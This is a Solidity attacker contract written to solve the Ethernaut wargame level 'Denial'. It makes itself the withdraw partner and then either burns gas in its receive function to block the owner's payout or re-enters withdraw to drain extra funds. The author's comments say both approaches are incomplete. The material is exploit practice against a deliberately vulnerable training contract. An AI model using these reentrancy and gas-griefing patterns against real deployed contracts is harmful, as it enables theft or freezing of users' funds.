// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

// Donnie Misino, 2022
// Ethernaught 20: Denial
// https://ethernaut.openzeppelin.com/level/0xf1D573178225513eDAA795bE9206f7E311EeDEc3

contract Denial_Hack {
  address denialInstance;
  bytes32[] trash;
  bool public useReentrancy = false;

  constructor(address _denialInstance, bool _useReentrancy) public {
    denialInstance = _denialInstance;
    useReentrancy = _useReentrancy;
  }

  function initiatePayout() public {
    IDenial c = IDenial(denialInstance);
    c.setWithdrawPartner(address(this));
    c.withdraw();
  }

  receive() external payable {
    if(!useReentrancy) {
      // This assert should burn remaining gas so that 
      // caller routine cant continue
      assert(false);
      // Note, I tried various ways to burn up gas besides the 
      // above asset call. In every case the remaining gas is
      // the same:
      //   Start:  28063628
      //   Ending: 445305
      // The owner.transfer() call in the sending contract
      // does not seem to happen after this, however no error.
      // Need to revisit and trace to see exactly what is happening.
    } else {
      // As an alternative approach, we can use a reentrancy 
      // attack. This code is working to withdraw more money than 
      // we are entitled to, but not all, so the conditions
      // for the challenge are not currently met ("deny the owner from 
      // withdrawing funds"). Need to revisit.
      IDenial c = IDenial(denialInstance);
      // c.setWithdrawPartner(address(this));
      c.withdraw();
    }
  }
}

interface IDenial {
  function setWithdrawPartner(address) external;
  function withdraw() external;
  function contractBalance() external view returns (uint);
}